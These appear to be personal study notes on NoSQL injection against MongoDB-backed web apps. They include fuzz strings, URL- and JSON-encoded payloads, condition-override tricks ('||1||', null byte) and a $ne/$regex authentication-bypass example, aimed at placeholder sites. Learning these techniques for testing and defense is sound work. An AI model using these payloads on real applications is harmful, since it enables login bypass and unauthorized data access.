
## syntax injection 
this type is very rare
#### **Detecting syntax injection**
- submit strings and special characters that trigger a database error or some other detectable behavior 
EX : mongodb 
```mongodb
'"`{
;$Foo}
$Foo \xYZ
```
Url version : 
```url
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
- In some applications, you may need to inject your payload via a JSON property instead 
JSON version :
```

'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

#### **Determining which characters are processed**
```
https://insecure-website.com/product/lookup?category='    => cause error
https://insecure-website.com/product/lookup?category=\'   => work
```

#### **Confirming conditional behavior**
```
' && 0 && 'x
' && 1 && 'x
```

#### **Overriding existing conditions**
payload:
```
'||1||'
```
url sent:
```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```
code in backend :
```
this.category == 'fizzy'||'1'=='1'
```

- You could also add a **null character** after the category value. MongoDB may ignore all characters after a null character. 
- This means that any additional conditions on the MongoDB query are ignored

## NoSQL operator injection

Operator | Description
--- | ---
`$where` | Matches documents that satisfy a JavaScript expression. This operator allows you to write custom JavaScript functions to filter and select documents in a collection. It's a powerful but potentially slow operator, so use it with caution.
`$ne` | Matches all values that are not equal to a specified value. It's used to find documents where a specific field is not equal to a given value.
`$in` | Matches all of the values specified in an array. It's used to find documents where a specific field's value is one of the values in a provided array.
`$regex` | Selects documents where values match a specified regular expression. It's used for pattern matching to find documents with values that match a given regular expression pattern. This is especially useful for text-based searches.


#### **Submitting query operators**

In JSON:
```json
{"username":{"$ne":"invalid"}}
```
In URL-based:
```
GET : 

http://vulnApp/login/?username[$ne]=invalid

POST :

username[$ne]=invalid

```

Auth bypass Example : 
```json 
{
"username":{
"$regex" : "admin.*"
},
"password":{
"$ne" : "ayklam"
}
}
```

